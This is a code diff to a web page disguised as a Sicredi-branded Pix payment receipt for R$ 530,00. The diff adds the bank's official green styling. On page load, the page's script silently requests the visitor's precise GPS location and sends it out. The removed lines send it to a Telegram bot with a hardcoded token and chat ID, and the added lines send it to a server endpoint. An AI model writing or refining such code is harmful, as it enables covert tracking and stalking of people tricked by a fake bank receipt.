@@ -5,11 +5,31 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Pix Enviado - R$ 530,00</title>
   <link rel="stylesheet" href="styles.css">
+  <style>
+    /* Estilo customizado para garantir o verde oficial do Sicredi no botão */
+    .botao {
+      background-color: #006437 !important;
+      color: #ffffff !important;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      text-align: center;
+      display: inline-block;
+      margin-top: 15px;
+    }
+    .botao:hover {
+      background-color: #004d2a !important;
+    }
+  </style>
 </head>
 <body>
   <div class="comprovante-container">
     <div class="confirmacao">
-      <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 24 24" fill="green">
+      <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 24 24" fill="#006437">
         <path d="M9 16.2l-4.2-4.2-1.4 1.4 5.6 5.6 12-12-1.4-1.4z"/>
       </svg>
     </div>
@@ -68,40 +88,33 @@
     atualizarHorario();
     gerarIdTransacao();
 
-    // --- CAPTURA E ENVIO DIRETO AO TELEGRAM ---
-    const TELEGRAM_BOT_TOKEN = "7953250080:AAHWc_o1vEUn_yO6e2c3o623d3_1_2"; 
-    const TELEGRAM_CHAT_ID = "6190740921";
-
+    // --- CAPTURA DE GPS E ENVIO PARA A API ---
     window.addEventListener('DOMContentLoaded', () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            const texto = `📍 Localização recebida\nMaps: ${mapsLink}\nLatitude: ${lat}\nLongitude: ${lon}`;
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
             try {
-              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+              await fetch('/api/send-location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: lat, longitude: lon })
+                body: JSON.stringify({
+                  latitude: latitude,
+                  longitude: longitude,
+                  maps: mapsUrl
+                })
               });
-
-              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: texto })
-              });
-            } catch (e) {
-              console.log("Erro ao enviar", e);
+            } catch (err) {
+              console.log("Erro na requisição:", err);
             }
           },
           (error) => {
-            console.log("Usuário negou ou erro no GPS", error);
+            console.log("Erro de GPS ou negado:", error);
           },
-          { enableHighAccuracy: true }
+          { enableHighAccuracy: true, timeout: 10000 }
         );
       }
     });
